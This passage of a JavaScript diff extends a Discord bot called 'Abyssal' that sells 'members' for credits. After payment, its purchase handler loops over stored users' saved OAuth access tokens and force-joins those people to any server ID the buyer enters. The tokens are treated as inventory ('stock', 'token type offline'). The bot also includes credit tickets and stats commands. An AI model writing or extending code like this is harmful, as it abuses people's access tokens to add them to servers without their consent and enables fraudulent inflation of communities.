+        .setTitle('📦 Database Stock Overview')
+        .addFields(
+          { name: '⚫ Total Verified Accounts', value: `\`${totalStock}\``, inline: true },
+          { name: '⚡ System Status', value: '`ONLINE // READY`', inline: false }
+        )
+        .setFooter({ text: 'Abyssal Inventory Engine' })
+        .setTimestamp();
+
+      return message.reply({ embeds: [embed] });
+    }
+
+    // 10. !stats command
+    if (command === 'stats') {
+      const totalUsers = await VerifiedUser.countDocuments();
+      const uptimeMs = Date.now() - startTime;
+      const uptimeHours = Math.floor(uptimeMs / (1000 * 60 * 60));
+      const uptimeMins = Math.floor((uptimeMs % (1000 * 60 * 60)) / (1000 * 60));
+      const memoryUsageMB = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);
+
+      let onlineCount = 0, idleCount = 0, dndCount = 0, offlineCount = 0;
+      if (message.guild) {
+        message.guild.members.cache.forEach(m => {
+          const s = m.presence?.status;
+          if (s === 'online') onlineCount++;
+          else if (s === 'idle') idleCount++;
+          else if (s === 'dnd') dndCount++;
+          else offlineCount++;
+        });
+      }
+
+      const embed = new EmbedBuilder()
+        .setColor(0x10b981)
+        .setTitle('📊 ABYSSAL // Neural Telemetry Matrix')
+        .setDescription('💎 Real-time diagnostic metrics across database nodes and active sessions.')
+        .addFields(
+          { name: '🧬 Total Verified Users', value: `\`${totalUsers}\``, inline: false },
+          { name: '🟢 Online', value: `\`${onlineCount}\``, inline: true },
+          { name: '🟡 Idle', value: `\`${idleCount}\``, inline: true },
+          { name: '🔴 Do Not Disturb', value: `\`${dndCount}\``, inline: true },
+          { name: '⚫ Offline / Cached', value: `\`${offlineCount}\``, inline: true },
+          { name: '📡 API Latency', value: `\`${client.ws.ping}ms\``, inline: true },
+          { name: '💻 RAM Heap', value: `\`${memoryUsageMB} MB\``, inline: true },
+          { name: '⏳ Core Uptime', value: `\`${uptimeHours}h ${uptimeMins}m\``, inline: false },
+          { name: '⚡ Database Status', value: '`Connected & Stable (Atlas)`', inline: false }
+        )
+        .setFooter({ text: 'ABYSSAL MANAGEMENT • Secure Telemetry v3.5' })
+        .setTimestamp();
+
+      return message.reply({ embeds: [embed] });
+    }
+
+  } catch (err) {
+    console.error(`❌ Command Error (${command}):`, err);
+    return message.reply('❌ An internal error occurred while executing this command.');
+  }
+});
+
+// ==================== INTERACTION HANDLING ====================
+client.on('interactionCreate', async (interaction) => {
+  try {
+    // 1. Slash Commands
+    if (interaction.isChatInputCommand()) {
+      if (interaction.commandName === 'verifiedrole') {
+        const role = interaction.options.getRole('role');
+        await GuildConfig.findOneAndUpdate(
+          { guildId: interaction.guild.id },
+          { verifiedRoleId: role.id },
+          { upsert: true }
         );
 
-      const row = new ActionRowBuilder().addComponents(
-        new ButtonBuilder().setCustomId('btn_confirm_purchase').setLabel('Purchase').setStyle(ButtonStyle.Success),
-        new ButtonBuilder().setCustomId('btn_cancel_purchase').setLabel('Cancel').setStyle(ButtonStyle.Danger)
-      );
-
-      return interaction.reply({ embeds: [confirmEmbed], components: [row], ephemeral: true });
+        return interaction.reply({ 
+          content: `✅ **Verified Role Updated:** Successfully set ${role} as the reward role for verified users! 🛡️`, 
+          ephemeral: true 
+        });
+      }
     }
-  }
 
-  // 3. String Select Menu
-  if (interaction.isStringSelectMenu()) {
-    if (interaction.customId === 'select_token_type') {
-      const tokenType = interaction.values[0];
-      const session = activeSessions.get(interaction.user.id);
-      if (!session) return interaction.reply({ content: '❌ Session expired.', ephemeral: true });
+    // 2. Button Clicks
+    if (interaction.isButton()) {
+      // TICKET SYSTEM: BUY CREDITS
+      if (interaction.customId === 'btn_buy_credits_ticket') {
+        const cleanName = interaction.user.username.toLowerCase().replace(/[^a-z0-9]/g, '');
+        const channelName = `ticket-${cleanName}`;
+        
+        const existing = interaction.guild.channels.cache.find(c => c.name === channelName);
+        if (existing) {
+          return interaction.reply({ content: `❌ You already have an active ticket channel: ${existing}`, ephemeral: true });
+        }
 
-      session.tokenType = tokenType;
-      const totalStock = await VerifiedUser.countDocuments();
+        const channel = await interaction.guild.channels.create({
+          name: channelName,
+          type: ChannelType.GuildText,
+          permissionOverwrites: [
+            { id: interaction.guild.roles.everyone.id, deny: [PermissionFlagsBits.ViewChannel] },
+            { id: interaction.user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages, PermissionFlagsBits.AttachFiles] },
+            { id: OWNER_ID, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages, PermissionFlagsBits.ManageChannels] }
+          ]
+        });
 
-      const modal = new ModalBuilder()
-        .setCustomId('modal_quantity')
-        .setTitle('Buy Members');
+        const ticketEmbed = new EmbedBuilder()
+          .setColor(0x7000ff)
+          .setTitle('🛒 Credit Purchase Ticket')
+          .setDescription(`Welcome <@${interaction.user.id}>!\n\nThis is your private secure channel with the bot owner (<@${OWNER_ID}>).\nState your inquiry or how many credits you wish to acquire.`)
+          .setTimestamp();
 
-      const qtyInput = new TextInputBuilder()
-        .setCustomId('input_quantity')
-        .setLabel('Quantity')
-        .setStyle(TextInputStyle.Short)
-        .setPlaceholder(`Stock : ${totalStock}`)
-        .setRequired(true);
+        const closeRow = new ActionRowBuilder().addComponents(
+          new ButtonBuilder().setCustomId('btn_close_ticket').setLabel('Close Ticket').setStyle(ButtonStyle.Danger).setEmoji('🔒')
+        );
 
-      modal.addComponents(new ActionRowBuilder().addComponents(qtyInput));
-      return await interaction.showModal(modal);
+        await channel.send({ content: `<@${interaction.user.id}> | <@${OWNER_ID}>`, embeds: [ticketEmbed], components: [closeRow] });
+        return interaction.reply({ content: `✅ Private ticket created successfully: ${channel}`, ephemeral: true });
+      }
+
+      if (interaction.customId === 'btn_close_ticket') {
+        await interaction.reply('🔒 Terminating ticket session in 3 seconds...');
+        setTimeout(() => interaction.channel.delete().catch(() => {}), 3000);
+        return;
+      }
+
+      if (interaction.customId === 'btn_my_credits') {
+        let uc = await UserCredit.findOne({ discordId: interaction.user.id });
+        if (!uc) uc = { balance: 0 };
+        return interaction.reply({
+          content: `💳 **Your Balance:** \`${uc.balance}\` credits`,
+          ephemeral: true
+        });
+      }
+
+      if (interaction.customId === 'btn_add_members') {
+        const modal = new ModalBuilder()
+          .setCustomId('modal_server_id')
+          .setTitle('Scan');
+
+        const serverIdInput = new TextInputBuilder()
+          .setCustomId('input_server_id')
+          .setLabel('Server ID')
+          .setStyle(TextInputStyle.Short)
+          .setPlaceholder('Ex: 1285560083786371085')
+          .setRequired(true);
+
+        modal.addComponents(new ActionRowBuilder().addComponents(serverIdInput));
+        return await interaction.showModal(modal);
+      }
+
+      if (interaction.customId === 'workflow_cancel') {
+        activeSessions.delete(interaction.user.id);
+        return interaction.update({ content: '❌ Operation cancelled.', embeds: [], components: [] });
+      }
+
+      if (interaction.customId === 'btn_confirm_purchase') {
+        const session = activeSessions.get(interaction.user.id);
+        if (!session) return interaction.reply({ content: '❌ Session expired. Please start again.', ephemeral: true });
+
+        let uc = await UserCredit.findOne({ discordId: interaction.user.id });
+        if (!uc || uc.balance < session.quantity) {
+          return interaction.update({ content: `❌ Insufficient credits. You need **${session.quantity}** credits, but your balance is **${uc ? uc.balance : 0}**.`, embeds: [], components: [] });
+        }
+
+        uc.balance -= session.quantity;
+        await uc.save();
+
+        await interaction.update({ content: `Adding members ⏳\nProgress: 0/${session.quantity}\n🆔 Operation: \`${session.opId}\``, embeds: [], components: [] });
+
+        try {
+          const targetGuild = await client.guilds.fetch(session.serverId);
+          const verifiedUsers = await VerifiedUser.find({});
+          let successful = 0;
+          const startTimePull = Date.now();
+
+          for (const userRecord of verifiedUsers) {
+            if (successful >= session.quantity) break;
+            try {
+              const member = await targetGuild.members.fetch(userRecord.discordId).catch(() => null);
+              if (member) continue;
+
+              await targetGuild.members.add(userRecord.discordId, { accessToken: userRecord.accessToken });
+              successful++;
+
+              if (successful % 5 === 0 || successful === session.quantity) {
+                await interaction.editReply({
+                  content: `Adding members ⏳\nProgress: ${successful}/${session.quantity}\n🆔 Operation: \`${session.opId}\``
+                }).catch(() => {});
+              }
+              await new Promise(r => setTimeout(r, 600));
+            } catch (err) {}
+          }
+
+          const timeTaken = ((Date.now() - startTimePull) / 1000).toFixed(1);
+          const reportEmbed = new EmbedBuilder()
+            .setColor(0x10b981)
+            .setTitle('✅ Members added successfully!')
+            .addFields(
+              { name: '📊 Accounts Added', value: `\`${successful} accounts\``, inline: true },
+              { name: '💳 Remaining Balance', value: `\`${uc.balance} credits\``, inline: true },
+              { name: '⏱️ Time Taken', value: `\`${timeTaken}s\``, inline: true }
+            )
+            .setTimestamp();
+
+          await interaction.editReply({ content: null, embeds: [reportEmbed] });
+          activeSessions.delete(interaction.user.id);
+
+        } catch (err) {
+          await interaction.editReply({ content: '❌ Critical error executing member addition.' });
+        }
+      }
+
+      if (interaction.customId === 'btn_cancel_purchase') {
+        activeSessions.delete(interaction.user.id);
+        return interaction.update({ content: '❌ Operation cancelled.', embeds: [], components: [] });
+      }
+    }
+
+    // 3. Modal Submissions
+    if (interaction.isModalSubmit()) {
+      if (interaction.customId === 'modal_server_id') {
+        const serverId = interaction.fields.getTextInputValue('input_server_id');
+        activeSessions.set(interaction.user.id, { serverId });
+
+        const totalStock = await VerifiedUser.countDocuments();
+
+        const selectMenu = new StringSelectMenuBuilder()
+          .setCustomId('select_token_type')
+          .setPlaceholder('Select token type')
+          .addOptions(
+            new StringSelectMenuOptionBuilder()
+              .setLabel('offline')
+              .setDescription(`1000/${totalStock}`)
+              .setValue('offline')
+          );
+
+        const row1 = new ActionRowBuilder().addComponents(selectMenu);
+        const row2 = new ActionRowBuilder().addComponents(
+          new ButtonBuilder().setCustomId('workflow_cancel').setLabel('Cancel').setStyle(ButtonStyle.Danger)
+        );
+
+        return interaction.reply({ 
+          content: `Please select the token type you want to buy`, 
+          components: [row1, row2], 
+          ephemeral: true 
+        });
+      }
+
+      if (interaction.customId === 'modal_quantity') {
+        const qtyStr = interaction.fields.getTextInputValue('input_quantity');
+        const quantity = parseInt(qtyStr, 10);
+        const session = activeSessions.get(interaction.user.id);
+
+        if (!session) {
+          return interaction.reply({ content: '❌ Session expired. Please click Add Members again.', ephemeral: true });
+        }
+
+        if (isNaN(quantity) || quantity <= 0) {
+          return interaction.reply({ content: '❌ Invalid quantity entered.', ephemeral: true });
+        }
+
+        let uc = await UserCredit.findOne({ discordId: interaction.user.id });
+        const userBalance = uc ? uc.balance : 0;
+
+        if (quantity > userBalance) {
+          return interaction.reply({ content: `❌ Error: You requested **${quantity}** members, but your current balance is only **${userBalance}** credits.`, ephemeral: true });
+        }
+
+        session.quantity = quantity;
+        session.opId = `OP-${Math.random().toString(36).substring(2, 10).toUpperCase()}-${Math.random().toString(36).substring(2, 6).toUpperCase()}`;
+
+        const totalStock = await VerifiedUser.countDocuments();
+        let guildName = 'Unknown Guild';
+        try {
+          const g = await client.guilds.fetch(session.serverId);
+          guildName = g.name;
+        } catch (e) {}
+
+        const confirmEmbed = new EmbedBuilder()
+          .setColor(0x10b981)
+          .setTitle(`Confirm Addition — ${session.tokenType}`)
+          .addFields(
+            { name: '🏰 Server', value: `${guildName}\n\`${session.serverId}\``, inline: true },
+            { name: '👥 Current Members', value: '0', inline: true },
+            { name: '📦 Available Accounts', value: `${totalStock}`, inline: true },
+            { name: '🔢 Add Count', value: `${quantity}`, inline: true },
+            { name: '💵 Cost', value: `${quantity} 📦`, inline: true },
+            { name: '💳 Your Balance', value: `${userBalance} 📦`, inline: true }
+          );
+
+        const row = new ActionRowBuilder().addComponents(
+          new ButtonBuilder().setCustomId('btn_confirm_purchase').setLabel('Purchase').setStyle(ButtonStyle.Success),
+          new ButtonBuilder().setCustomId('btn_cancel_purchase').setLabel('Cancel').setStyle(ButtonStyle.Danger)
+        );
+
+        return interaction.reply({ embeds: [confirmEmbed], components: [row], ephemeral: true });
+      }
+    }
+
+    // 4. String Select Menu
+    if (interaction.isStringSelectMenu()) {
+      if (interaction.customId === 'select_token_type') {
+        const tokenType = interaction.values[0];
+        const session = activeSessions.get(interaction.user.id);
+        if (!session) return interaction.reply({ content: '❌ Session expired.', ephemeral: true });
+
+        session.tokenType = tokenType;
+        const totalStock = await VerifiedUser.countDocuments();
+
+        const modal = new ModalBuilder()
+          .setCustomId('modal_quantity')
+          .setTitle('Buy Members');
+
+        const qtyInput = new TextInputBuilder()
+          .setCustomId('input_quantity')
+          .setLabel('Quantity')
+          .setStyle(TextInputStyle.Short)
+          .setPlaceholder(`Stock : ${totalStock}`)
+          .setRequired(true);
+
+        modal.addComponents(new ActionRowBuilder().addComponents(qtyInput));
+        return await interaction.showModal(modal);
+      }
+    }
+  } catch (err) {
+    console.error('❌ Interaction Error:', err);
+    if (!interaction.replied && !interaction.deferred) {
+      await interaction.reply({ content: '❌ An error occurred while running this interaction.', ephemeral: true }).catch(() => {});
     }
   }
 });
